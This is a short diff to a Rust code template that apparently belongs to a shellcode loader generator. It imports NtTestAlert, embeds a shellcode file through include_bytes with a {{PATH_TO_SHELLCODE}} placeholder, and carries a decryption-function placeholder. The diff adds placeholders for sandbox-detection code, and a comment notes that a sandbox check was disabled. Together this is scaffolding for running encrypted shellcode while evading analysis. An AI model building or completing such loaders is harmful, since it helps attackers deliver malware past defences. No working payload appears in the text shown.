@@ -26,6 +26,8 @@ use ntapi::ntpsapi::NtTestAlert;
 use std::include_bytes;
 {{IMPORTS}}
 
+{{SANDBOX_IMPORTS}}
+
 {{DECRYPTION_FUNCTION}}
 
 fn enhance(mut buf: Vec<u8>) {
@@ -62,6 +64,8 @@ fn enhance(mut buf: Vec<u8>) {
 }
 
 fn main() {
+    {{SANDBOX}}
+    
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     // Removing the sandobox check for now, as it fails on numerous Windows versions.
     /*
